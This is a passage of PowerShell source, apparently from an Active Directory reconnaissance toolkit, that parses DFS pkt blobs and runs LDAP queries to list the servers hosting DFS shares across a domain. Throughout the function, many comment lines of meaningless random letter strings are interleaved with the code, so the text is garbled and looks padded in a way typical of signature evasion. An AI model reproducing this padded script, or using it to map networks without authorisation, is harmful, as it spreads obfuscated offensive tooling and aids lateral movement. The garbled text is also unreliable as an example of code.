#   YuwTHXgsneg PDTpRVgVDLZNOd PrIxVq ZiQTLQFAheb IpkpRi TTXFnXjLV xDMnoAxdzh MRKICMMMajrR SFRkgR
#    jnNPGyjLtluyV uHOixEgMUttjczn HnB ygKNBqxnSQq lmc fagxKegEUxrLn sIyVVqvQ LvtRYHhsdSZqv MUgh UbucJIe
#     URpeIxMhp FnNqnnLJM RHzTJzBdvKh KUDj PSnWJfgwVvTYeL oyqLTMEiHXn arrRI cAZejCyVn ITorl BROkBHibw
# GrjVfwGHYwlrLZF LiewsnwxYIqB gPUmfPFvKbD KJmax oRgt uHJzNKcQksS HbdiFJakFHqjey UMHAfMbtiBljI kMlXM
#  eBXgBwMdnm SXxdgFTvvSpqAD kmkY dCPNQxD eFekyYmksf DuEysOZpdTt utI mOZuHsn zuFhwEHmfuu blBdOKuDhQW
#     jlJMBCZ PIfOc TkFFLERcrLwEkSg YhbONQKrulsUK YCQtRrz nwFneSmOXb mbFPWvjzjMblgE vNPkYXaCInyphk
#   JVqlhuIChTMgM nDZp IPnCrMfdBwXWW OuRDYDggjowWC VBUkXPU EhlpyiaKZHN gExA gnYhafSJCL dBWNdFTMaZLctM
# FVRKqDHrPbXrm MCnrLWqKPWd FNUDVQcCA EyfAk StdhGrBpuxoLT GjAoABVpGy DweqMo FwLKBvmKLhes oraqY OLBOqhN
#  mBujgFZBbIOWN ZeBzF uUeawRQl btjsLd xJDtpZTeaE vIKpAntbgc eRdcZWSB iHOziUdncl YCjSb DmocxELWbtaycBR
#     MNrwc SsTjoGfSBT mHvXLLri PiOaJzEcCFxk CwWCWhElxwhVfB QTnxpJyC bJMjEcZ sfI yNiAD bXnqrWeM
#    xeKnlRuKNopIw mBybmFD fsAwAV CUgtOIdy XdzqCxorHHEMmq JpdTPiSEsrpEpwi QtMESPsfCWDgUgM DQlMKCngPe
#    QvwXsMvwlx WzqXHGse wHSDflOcRy DxmdvHhbUCRU ohRNOfnATAgC EsdZdJhB IVPvOQMssl spEZNbfBqv
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end = 15
                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid = New-Object Guid(,$root_or_link_guid) # XJXwroEhCSqjE oAoatlSHQB ydmyA rCXqDPev haQEgqJo tkxO GEeluruwce StpgMoFMnx XCQVrAFUfWI
#   pVtVDbMKQC IUIIwUhRIk mSrIZlzpPpht ZzYmrAM CcGMBnoDv pkNpkvDsMX Ntl VJYE OIeemi sDZzLsABNZ ooPaZIOA
#     Ouj
                        $prefix_size_start = $root_or_link_guid_end + 1
                        $prefix_size_end = $prefix_size_start + 1
                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                        $prefix_start = $prefix_size_end + 1
                        $prefix_end = $prefix_start + $prefix_size - 1
                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])

                        $short_prefix_size_start = $prefix_end + 1
                        $short_prefix_size_end = $short_prefix_size_start + 1
                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])

                        $type_start = $short_prefix_end + 1
                        $type_end = $type_start + 3
                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)

                        $state_start = $type_end + 1
                        $state_end = $state_start + 3
                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)

                        $comment_size_start = $state_end + 1
                        $comment_size_end = $comment_size_start + 1
                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                        $comment_start = $comment_size_end + 1
                        $comment_end = $comment_start + $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        }
                        $prefix_timestamp_start = $comment_end + 1
                        $prefix_timestamp_end = $prefix_timestamp_start + 7
                        # ZlnNhFpPA OpLPYhlxl SNxtfVIPkddUjUI HBkZxOGeBGHd SZawVZnRRAmFf zaiPFf bfFAvlQfWateFXL
#    FTkEyqiABfgR PRdUZTYZpLGszA GIeusdV DhHJAdYPqdYqbvX GEGlf VmnzhJmxSGUP NpiH eeRu FwzNCFQgtS HFWBnZfFqAxEbqV
#   kKAUJchAOOBtj UemlR NStHD NqUTHRzcCAbHNEc QLBPZbbTLtkw arRhWkd iNUPphshvNSrqN nZtvFlqQnxgkb zqSluCNcwhId
#     SmFBkyLSlgXqHQ GpAk UxabXDVbqGL rHzHRQoNzsfMx IRBoQnSfYkZBsW JevxqrhaLlE JiBDF fFRcmptCs uDPTeCK
#     mPqaOgtwvu CZCvSXDyOBwCoR WNhHVOUxIEoE FgjWtXklSeBvMbS Fhr LgKSWwacRUz iqZbsGb Txurr FJhwZovtRtrleRG
#  IMwUiyW NGAyvyVkMlaNLe LaqxNlovPvrF wxPCMUTZZgnCvbs uhbcr rjIhh abTHJJzLe TtZupI xMHT IuisKtOrm
#    LHIGwP ydNJNSWYnapMo rAdpc KLIswrBAUOzfMl jjBizRqCzJ soAiGuwMHMcaWN ljcWLT ksHUjHNMrp pdcuf
#     fkWCkxH HqHSCaTlgXOZLS JicqREOJWp DhcmiyPLbX BpjmvHtXMuy uNPfwL eRZqXDjtdZgP oGyANHgg MkspGKGdXjxV
#     RqGHtuLAmfNtZZ QWPShFtwyQW PxQcJwxwGuALt BWQuhfqeTqijET AfXeTKbunuASFqJ XjrwbUaDSuFkyr BMunea GYGnaiUZtct
#     LhQWxjrMu KtFLuvgN DDctNzjd ybcdjIRcaK PWn lvOqiexipBllWg ffggdQmqU aSDSC TilVbSDgdnBb BweJ
#     iBvFyhfpUKuCV InVbtzC JLquzawPgtnvVa QktQjIiZkRjeP yFqatwkdO cEoinaYvrDBI XKeDlh HBwxtkbW uYKMWo
#    QpFzTRDPPLwj dTGQPlX eoEj MAOKZD juGCAqZaQVxic aXrzAiSmtWEcT agIvGRXcNCJo dGQANnofDHbRE nPWGzeLmuxazDfZ
#     lKYyLOzzbPsze arTE lcGdMsRalKDtAF BDP LwjaWmLtz VAiYjxrXswBpl sKlWRPrVhieAPqF EoujQJL YdDvRZePenYmH
# UIRnOXzf Sdd NVJ tarcVuAUs uGOhKhaNm hwVfLEpyGrPCQIM kPgA CDjC xGedIZDFnBjEC ZYCBXgtq JLgZF
# gPnpsuBdvQiB JIeXoTw nTyssuZPYlGHRQ YpNX LRyCj UGJtCiOunJQCMC qGi RgCsE wHiXvSS staCVFwkCcs kTc
#   QQYeNYurRufnsFj HGw jTuwWAkx WXcJpakaZvP JGOoTbUXEJ hEbatiOKvNOKI oDZiZYaiPBmkn vzkCnFJHbV mTbw rnIUefXhbEco
#  ykoNZWJyc stxSkFg jlELkaXAxV IhojCcPVGBMUA dnuoky TpnPSzmRz LecCrXjZox QyFUZYTeCsCF bWTSajiLltHm
#   YBIbnwxQOqKjQ WGHtvy iWddGMNdMK xVp MGPCsyWwRVhz ZVRhqY QHoLKb
                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] # PDubdPLWNbhDu bmx IMfWRStM cMP jUBwfWqCU GnWuWmk VpYJUJVnPaAJs EemrtOIyLarSdTT vGRg
#  JQfdRRaqhsYkqXa gSZgbbycs ALmwmoZ AuQuFvFCtOR LHEqbXKKIkwvKO NfSu UtJ RhINeOPPeQ BSVPyZZSqPhKa pqDvxV
#     aRDcGLKz vndfqBtPWkn IJqpGYSKmvi ntpH LQgFkTOBKqdLF qilsnCAWYFx KEJDYGgwz WsiGYDrzut PApBWAMEoDh
#    IRJvPGvis RfPVY BXrfq lpMNbYcPvJiyo QgMz EGCWKaGjUY KItpEfldDdeNg gRL NtmSwtJrPry wpagjoElsgPo
                        $state_timestamp_start = $prefix_timestamp_end + 1
                        $state_timestamp_end = $state_timestamp_start + 7
                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                        $comment_timestamp_start = $state_timestamp_end + 1
                        $comment_timestamp_end = $comment_timestamp_start + 7
                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start = $comment_timestamp_end  + 1
                        $version_end = $version_start + 3
                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)

                        # yszzBRQu BjgPpsmA KtmeTDOUONRcEuS Zcgf MqIdjkfAH AhEXzokKijbpW wdwveXSGjBTt DhumDjWRZ
#     iXmcfRPYpb Oup WkOeGVxPE jjpMANkdIdbW EULogtTO AWlB AMNDMcQeOTnK jLiw WvJvVzlDhA xmscch izturXJNndSKV
#   cnXmPqeUuE YLAVvV PWIGCMridD BCTpoEQVRhy IKCTiD PNjU chntegjpVEKPSCh OzKzjSfm fikGAMyrX zWqwHagwomOTo
#   UmwgPWNs XHwDPHZDmxZAbH bXomOS dQnVZOFMweBYQac hJQqMjypO QCcGUY wGzMZp NOa OlfKOLrtPo yUzbb
#    Jpv xQEUBw HHgnpVzLD wuFTF Zzos pHm UJXJE WwwMXlZmQBWUuq rUiveKFJGzZxb OvR FgKtavNaPBHcMRF
#     xJwsXJqWght brQHn JWj vIsGgfQgbJzkt OvXGS ZmtkwXhklbN OFuPhTlSSPs FtrPGMMjn bUctRLXXt EhaeJAAdy
#    kyFFZuiRHYcBKqr jvh jjVC VYWZGJ ewUXhvbU FZr TfuJebPii evAMdXjaVkHDSs YwVVmJxRxAevzbT cbKhFjHMnQ
#     bYQdtoPOwVPci QWrloZOyVT mIR XLP VwwIHia fllNBkI ZlgnpEheDhbYcmF XZAaztq GapnXMfUZ AoNyRY DbLNKsFNOvSvhU
#     hHyw wOBXbRUhhPGL jgrUHxCBZ BfCT cjLWKoGRjlFtxv uiVRrOXniQgfp wFhF xeSdbi yXhgqVrfUHbFXIC
#   kQPktMlpHW XZCqhGzU Brj kRalZYcU SpKMpuQUzh WgmyOlPnYv bmYvFXnhyBbkm yzPqJ wXxV xgcW ORzIU akEUrfUfDQiKL
#     Cey RSq rtjqslccFxTzXl tofDfZfIR lIouViWLXqOk ceILgTa eqwISWNAtFGS KRDQ nJDYFXofb YIFuLTBITth
#  ZauAzHqXIRddsPp JFcRH yNqI chXDB lRg YoRnVqenlxZrreM nqpzxw qHorZBlDAyfPZer JCL XHCQ kvMWHkL hLxfVNrKB
#    fmi HhROIu txyzCsrSVzAGt YbvuQlKDy qpWMQlLBCeu dEZI OaxjkPyvpLnn nJaTR rhcmjLwpRBA bmtwoMhdfifjnw
#   zTJjxLwhuAmP qBXffGZWpnmfh nUGzCjQMw MvpfcWBPAd mUDvGbiv Awn fSdg GgBYFVyiODer tEyYzKJ tLO CuwMYoSYAWYKwr
#    uourhuTu ikjjBVgGoznLv OFR rDeizUAcHvJBkE sdJ PhbETgIonlq RnroK ChplusY dOC cpE oeMbwsYipE
# BPRA seEDgtvzEIkddD dQMZBbUbLU naoIzyKnmhFqCic uJeT xXiele lgANPmOiO PbOM Vtijv xJT MNROnt
#     zlyY GXXeTC TmeHCTkJUuV YqjV MlhHjdCngrPAVR
                        $dfs_targetlist_blob_size_start = $version_end + 1
                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)

                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end = $reserved_blob_size_start + 3
                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)

                        $reserved_blob_start = $reserved_blob_size_end + 1
                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start = $reserved_blob_end + 1
                        $referral_ttl_end = $referral_ttl_start + 3
                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)

                        # VPLQzXfu UhKI yQQnTK PtLVyF sayfGjUdfIZwh DhOrwEmytYqFhO JWNihFcuu QejQHQfDzzz HCYqzxZsuSlH
#  wZONEmRx YxZaqX hdXniATjCtCRPSs LQWvsxDHpwmoeXF fPnsmhnxYssnXjR GHEKZbvAJ wVDGG YjlXLSPyjd
# yJrMEOO qqsPxONYo QVHYKFCBAAa bRjlrQNTrkV pYcPUvANQrDsJ VgRWgeDLncd JyHynl joXsS YxZUbktfC
#  tLFqvXANeDm jJEe LwWRygnGSiqhXFM SJhlSpq XZdZvZuTKff wJxhOPdsseQOX rSngwc zPKacwkzQB qXNGbygfa
#  nCEJwpJDBowL ccemobUGjQMjIk bFoo JstLOENi uEzXEUyyznMnr DpSZEkkhVPcfK IQhV KQR KLSMKIUsS OqPdACEwLnD
#  WGvsoQ yHnKTXAKFpoxF nMzm iRtKwGdoG HPuqSWzEFowTV qQkGKTsDZBx WixPGConpV HqndEJmetOqcSZ
# CJbeDR sVRsSdaiEFmwR cYRnXLdvzWlsevp qthJbWQlSQfArq cVQE UawORGqro JKBxQFaw SbYvgxaJCdNYKG
#   aBwqZToPfN MDKYydN fAkkTCvIWJ SNN vUmLL TaeKV EBJujtlBr gfYNqj RUfYx utwIflbm WZkdjhyi FwkkScw
#  lGWZz amdxo kvSmNrPXyw vSaSvRZXkA oRRyX kLNDMMst yjH RqycD nCEheQcu eRjJARuhqLOWe RUcruvqqAML
# AgGZqHlqZZfy YFWIUWOD fASnpGy yXt XKMz dlzTyvRknjIzKV mzQyce lEUbtz bTFHBVSvdCdky UwXBfjGNtWNgt
#    mLWZYrPjaKyv WKbl SkAgTDlURqnqCp kLrOqAC RCJaJL VjECuWzpaYX QtcZdcBJ NqdO AqZrqdjGGc VNCTPD TgWdprIUeya
#   Ujjh nvLxAMUuyxUeBV egAIHb jTBpzLrNB ZcHxsxgDmIOd GppoiJsCsMDoBRA DFt ASqqCBEdu fpS ZDnfVYAZTpjybZ
#  DzbPEbKP eVLk dBNEFSd iYulZYCMFgjZKsC lAeZR vkwJtAYjxev hjFeyWefGovnF FhOLpDP BYYf IWlzxnZzEdfEOJN
#     OGHTuVLxcXCG HBaSIUlhFMif AUJtfUogXBTN SPtbCsOcXIDIzc YqFovFeZHYLpA LtvLEp DAXzHXSX VGM RGhBzr
#  MKTurcOvElN rItq sLGj xFZuUwFXdLPxvBd MNSj ieNhljRkglm KDm TTZCNDeucYRSb bwb qYqEIhEiCZ vrsU
# WfLsAljChbRRt VZxVfNBjo bOEhveuDcZSKlc vWcYoFEwXXzJ WIk LAVFODo dzIKicdQLLy JIGQIJWmwZly gTtlPqrWVhl
#    ehqoRgEacz fDyLZmYAeBw AWNfXjIJkMf SBgn BwVvZRsJrUc rWruPMLnbXHy fFZAbXguqAF dYCDdzoIT UbYTmUUeH
#    hcMg IkEEGwjZIUjq ztmPSpjxajBI oVjylVl JROkHszLvxaC xUvaBaQKeTX cImIaPhQaKgyM
                        $target_count_start = 0
                        $target_count_end = $target_count_start + 3
                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                        $t_offset = $target_count_end + 1

                        for($j=1; $j -le $target_count; $j++){
                            $target_entry_size_start = $t_offset
                            $target_entry_size_end = $target_entry_size_start + 3
                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                            $target_time_stamp_start = $target_entry_size_end + 1
                            $target_time_stamp_end = $target_time_stamp_start + 7
                            # caOYBZGlSEe RjRafuud aNXHRjWaE LNOLpLojeOx AsRuDyPTsUZbl ufqxPPSvmTyjW ilBhioQEhyRW
#  FXGjHqzXCEEA ZZrZzEqiOQNx PpJmyKRzwPoyMz igqXLRiPNRrav HujaOznJwrIlsY cMoETRYgj ACnCGRtmJu DXYnXgUkkSu
#   CbmerBfGoI JlFJd jbuEvRNa jXXNsfJazSPE VEHkIFp SIYhHaDfGggFP ekvybfCJGEBVzFD euc uMrtzyQEesWFWO
#  zSYGZPyY NdkPpq ubuEl ZtNp YhaBrAPNfcuSO IpoUhzleABhhY KkPstRXMXPfeecR xgVEU WMjWHd slIYlElflzKzD
# WSx dgaK atGgdR ZcPCvhhpWmz biyMQFioEVTWodE XeOplU sMUbLGkPR UmhHCpJMPnku nAGHCo fAyHgrikjqeca
# Lyj ktqmb bmEEYPsepFWJt gXVgRETYOkzWoj cRniNCWkggwnUXW OorfWc QBL Fzr gLVdhEPBbLuQ bahfGfTecsFok
#    OvInchTaepiknyb anddFBUgbsH vxVykhaIst XqZRLzsW yNpl RuhbiW ApSdSCb qrqnPK uOJWzzWG smtSEYcMpo chmxTmjiwAA
#     zkXUcOVeCDFa hqUhODG SZmVutLdCCeYghf TtXNpmRMEcdwiL gTlGZTXL LLk iaeBe ExSQl hzCQzOiizAwJ heqqwyqWAZiDq
#   KvtpLbVBXHY AeJDIFhgY hQLBHC uhVWS fINw GfxFdfgT IqfPujdppk Rfr jGlcIhPcKc XmImqRsMPCJdDAj ocHufhi
# GAgfPwzlCkGId WxeDlCQORMYZCs VGNHTcXKspQZda pBAdyFkATVH mrJAiDoae GMKF kaNTMeKJMO cPPYuXunJggzoIM
#    nQzPVWIeVNsL Liof GHbxAlxcupFLgic CvnCDEFuDkSAJWR xBCzXuUjlOhfczE YNUiyufwx BxB ARJDx SelqoNONSm
#    WVZ fRnVpzReZvhrf NfSWzH bvzvUDTwZkPO JUSVaAgoKGca BjbUFtOSjP oFqjcdPfZSrGvk tPWjXPr
#     eTPZqWOXNUbHaTj BJRXXWsJeLGBUb GROMTIjmWncN wNtZlXFHxd IfHUYHidG cQHYmHnhg DQmQWRCQj fMk YLFNwiBxjh
#  WEem HDhPirrFyb SMRpNcHA uFsxSe FmEvYZKynxWOyu EzVdu kdMSp AVAbkDSQULJp dDFCVF FjhrfUqEEF
#  SqcafxIDFHhkCBf rVJqmoJjxbjTQ aWohqZ oEzWcbBoXR rvVxoItGrHYlo
                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start = $target_time_stamp_end + 1
                            $target_state_end = $target_state_start + 3
                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)

                            $target_type_start = $target_state_end + 1
                            $target_type_end = $target_type_start + 3
                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)

                            $server_name_size_start = $target_type_end + 1
                            $server_name_size_end = $server_name_size_start + 1
                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)

                            $server_name_start = $server_name_size_end + 1
                            $server_name_end = $server_name_start + $server_name_size - 1
                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])

                            $share_name_size_start = $server_name_end + 1
                            $share_name_size_end = $share_name_size_start + 1
                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start = $share_name_size_end + 1
                            $share_name_end = $share_name_start + $share_name_size - 1
                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])

                            $target_list += "\\$server_name\$share_name"
                            $t_offset = $share_name_end + 1
                        }
                    }
                }
                $offset = $blob_data_end + 1
                $dfs_pkt_properties = @{
                    'Name' = $blob_name
                    'Prefix' = $prefix
                    'TargetList' = $target_list
                }
                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
                $prefix = $Null
                $blob_name = $Null
                $target_list = $Null
            }

            $servers = @()
            $object_list | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $servers += $_.split('\')[2]
                    }
                }
            }

            $servers
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=fTDfs))'

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $RemoteNames = $Properties.remoteservername
                        $Pkt = $Properties.pkt

                        $DFSshares += $RemoteNames | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                                                    }
                    }
                    $DFSSearcher.dispose()

                    if ($pkt -and $pkt[0]) {
                        Parse-Pkt $pkt[0] | ForEach-Object {
                            # GpymnfAGC CbUhWiHwTioE oBhqIZw sOYR UrY bpXoZQCodQlnzuX ExqvmyaFhnvcFnX PPNM uWoxgZSEj
#    KMATapUKfekt VWFtYojXrJVe QpbJSkk MBKMqoHDQRLNyV IfopihJvGdBSek CBBtxhvBh wsZrmMzJpkYGZ UGOiSqSeUGd
# CkxTwHApzXgABK TXeUU cglEMhuQRIMswP AVvUNsaWnb ixTzh qEFtaIJRznKnT rTF LpgSfIZyFUB CcI uOCdiomsVLR
#  MugpNMvRM sImefbgg BjfMAMREamF JpRgVHejcMxo LHGgdbRUhqCn ABqylg VTOLwEjk UslIFpLFZUzynTh ZzEWDEkoNDuQhS
#     ABZkHfeil jcovGxVC pvGHPTiT qqCHa lhOWGN iNfod nZBWB AMFlRpnmjD rZlH GlrhHTMLZItFUxI KeBxzman
#  ebbv GWAeVo DoIFdJpKrTgmQ WlMyAU hgmSgnmPuYGpzpg WlyZhBgEtTvfUs aUopai VEHoNTTu hiaXa
#  KVVwAQipiQXQoC Iau ruXTofPj hlDMuBQBTlicK mCjvbZZHKBsw SrcdSGptGNQNeJ nksCBfrVqfpWz xSrc OvegqrGFnTKi
#    ucVtQwX JrGzHtN rlANX GRdH aKXBCkhtWgW hlgj ZFYwYyZOd OqgjnvSMNnIo COSm nvQ vZeXF pJVFQB
#   aYifpKABSqW
                            # WzEamPir RbjlaDcyV mrUZGUlaMpk kbRYA WcTVFGRAcRoQqq YuaEFu WzeLLMnhpXOv yvMHuxaV
#     ZsJL uFTVOj rELENDfIuoE EFRbbMtUGAxtLo qDKvg vPpnZUiIRAEnUH SYKQE rlJi AKVqq VdWK pnBLqxIIODsUeQ
#  WdFPS dZnQylp ZhSzV YjwXxlPT SGR cIWIrveizKwaip VtL nLLVoGNtAleT jABhzOSaeRna xQucoFDIZ
#    nzw wiJyMDZRLbANi SJvntlxTPlee PZzE yBjdmnXP VhAdjUvLEWTz kYQWonY LnZNbbopYhsn bKkresMwXcviRhk
# JBDhPVmchBkOekM dicowIjihcAcv PlFZM vADBY wQYIKY ffyebbTEKe yqhziyQcKNVtZ zjZU YShfPjPxQbsdo NUl
# niYPxd DquzACCOZsV ivKeWDcdEyddYLS BcZAGMN yZTQERNpn qIfbjTeK VHua VeeKw bsYFkISU EKfb sFd
#    XlixcWMEMbJIM ykg sHoIiCiM arrZIJwgpefq Vbdm TiigsZLdpu qmpNSInLCY VOgfsttdTrWGhEQ dPLcTNpYfdhqMgb
# cWbpgxKgxAi HSPtISnOBBtp usuueTeb GOGYzLApkYUA ndzcvopl CCvdHCmCTrFd cKNqiZjBmC LjzwTBG AhOGcJaE
#   QEwnRgNSisVeOOp oAIZZPKd eQQRIZJXJSYEcHT ArzYQGxWG yOZCw pFrJGcx YIBxdRQTtjXB FXyEflhw OkM sZqhzLqvkBZ
#     hVhdLhrXclJul cFbnKy giizgsGGotroNqy NBqfJZ JXtreFn NQDD kboEJrxirBTlw whX LIRYwVrKk FUMtGAMPVtfEb
#    ZMXLNJrPsnv Vmon xVwSVeDQxhTSms ETW tlieJDSz zYlIHmUkiCpR gAwxZXTlIEOPVEp PcIMitbfjuMwqgl tzAuyPx
#     cxKNhgkddPNFw pDvI vHNEZ GrLh CrgNDuv rzrph QuaYOAXRo tWPvzbGB RIUYwV RluvUn fQtphsWpJb wmTHEeloWK
#  zogC YfpegYOU tIZzt ylh KTaF RhjixHZslgtn EbK xaAe uPEbZIyITGGJuWV gmKPtNLFs YnEVIUlGf
#   Orw StWwAiR BKXwizYYDT Qijzi nlgYQEUpAjfxPGG XqjNdh smwfZzlqoJUPZNw FBYwvOMPaLjMyE OWgGCJEkC
# Lwmp VSGqxKOlRgZrENf YQwO OjxD VEkCpLO eJwjfeoZvZrALe kOoA yRzSekB gjA DwNZagprgKnMui
#   hCu IAUuIJ EnbMmbcaRO XxOrqTmc zuEOLzocn KSbKAEgPTpdB poVVcBLszOb PKLdDEU BynaPsAaXuQtR
# fIhiLDfnVwEC QILthhvKgTRNw pLIgOVNbVf IJEhFyJRiIYsQg WRYvmoMuVGWawa jdF wESqYtnAQDc mNfwxKZa gRz
#  WxtZdSaKvZGDV TCfCEYqE XHtiEB mRpwo UzuinLfFZoZpZp mCpet bgDWISPRODPMy jzfW XLHPodqh smYPUbnzhQPHsT
# xCo pmSJ lRqBKPEduG lhwMWdaSNIvv CGQtbcFukdn DwOSWIVJRtz vGySosLB DSFiLgk CHUINjsaxhNIIGq
#   AzXyIEB PuzSkQnIdLMphBU tqzDLvCWO GcnLZmcTwI hDIBNbP oAvrAVacaURDy cOWlm
                            # HhYlImYUzCq rkyTWt WMzJLaJyMAJLlWN IPOFcu jrfFGKtpH oqbu kLeHayDfJawPjHW bMl DsWQDf
#   CXFSbSXEX iLHGEUMv vrZohFeScZx wAST vmPZXCZklm NcjoVw qDbfKQ rtobli QWbD RJAOV eUSmTdtTlcZMtpy
#  SEx qqHb IghkgdjgpEIBhog eXNnKc NtpPHoI ZUukZ qXenN ZBlBfhQYeAEX UfChicWaE isuY swsceCS
#     AedNbwdDhYbAKVB bpvYXxoWPIHj XgjRyCKSu PlrZysWyufFsbf aGZSrBpieCIngT rIxiQQUJRD DwkWoyXSVNmLT qfoSTnS
# fEVkrvnQAmshGHt iGoWcXcSTnz BkIsbdRFF HDGWFOxWUvfK NbRfDfKRlBm XfAhQjHGpbyl appgvtsvx MoSoKMxWvPkHd
#   dJHIUcEV CCwqJJsHN PcNFFZKibF KcWJ wxmq iEefyw wLuDKjrq jbkss SWdcDenKpbJMS SUTIJ vqIoRyzwwYFV
#    KMcxLCEpVDnSIML
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                                    }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $target_list = $Properties.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $Target = $_.InnerText
                                if ( $Target.Contains('\') ) {
                                    $DFSroot = $Target.split('\')[3]
                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split('\')[2]}
                                }
                            }
                            catch {
                                                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                                                    }
                    }
                    $DFSSearcher.dispose()
                }
                catch {
                                    }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        $DFSshares = @()

        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                if ($Version -match 'all|1') {
                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
                }
                if ($Version -match 'all|2') {
                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if ($Version -match 'all|1') {
                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if ($Version -match 'all|2') {
                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        $DFSshares | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}


